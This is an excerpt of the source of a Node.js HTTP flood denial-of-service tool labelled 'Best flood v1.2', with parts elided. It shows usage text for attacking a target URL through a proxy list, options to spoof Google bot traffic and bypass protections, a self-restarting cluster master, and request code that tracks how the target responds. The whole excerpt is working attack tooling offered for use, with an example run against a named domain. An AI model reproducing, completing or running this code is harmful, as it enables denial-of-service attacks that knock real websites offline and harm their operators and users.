...
if (process.argv.length < 7) {
    ...
    console.log('Product: Best flood v1.2');
    console.log(
        colors.underline.white('\nUsage') + ':'
    );
    console.log(
        colors.white(`     node ${process.argv[1]} <target> <time> <ratelimit> <threads> <proxy>`)
    );
    console.log(
        colors.white('\nExample') + ':'
    );
    console.log(
        colors.white(`     node ${process.argv[1]} https://iristeam.sbs/%RAND% 120 10 10 proxy.txt --cache --referer --origin --cookie --extra --spoof  --query --bypass`)
    );
    console.log(`
 ${'Options:'}
...
${colors.red('BYPASS HTTP DDOS FUNCTION :' )}
 --bypass   FAKE GOOGLE BOT        [Status: ${colors.green('ONLINE')}]
...
if (cluster.isMaster) {
    ...
    const restartScript = () => {
        ...
        console.log(colors.yellow('[Reset] Restarting the script') + ` ${colors.red(RESTART_DELAY)} ms...`);
        setTimeout(() => {
    ...
    const handleRAMUsage = () => {
        ...
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log(colors.red('\n[Ram] Maximum RAM usage:') + ` ${colors.red(ramPercentage.toFixed(2))} %`);
            restartScript();
        }
    };
                    ...
                    const request = client.request(dynHeaders)
                        .on("response", response => {
                            ...
                            if (response[":status"] <= 400) {
                                statuses = colors.rainbow("200 (OK)");
                            } else if (response[":status"] === 403) {
                                statuses = colors.green("403 (Forbidden)");
                            } else if (response[":status"] === 429) {
                                statuses = colors.magenta("Rate Limit");
                            } else if (response[":status"] === 525) {
                                statuses = colors.red("525 <none>");
                            } else if (response[":status"] === 502) {
                                statuses = colors.red(" Bad Gateway");
                            } else if (response[":status"] === 500) {
                                statuses = colors.red("500 (Internal Server Error)");
                            } else {
                                statuses = colors.blue("Non Code");
                            }
                            if (process.argv.includes('--debug')) {
                                console.log(`[${('Proxy')} : ${(parsedProxy[0])} | ${('Target')} : ${(args.target)} | ${('Status')} : ${statuses} | ${('User-Agent')} : ${(dunghoitaisao)} | ${('Path')} :${(vcl)}`);
                            }
                            request.close();
                            request.destroy();
                            return;
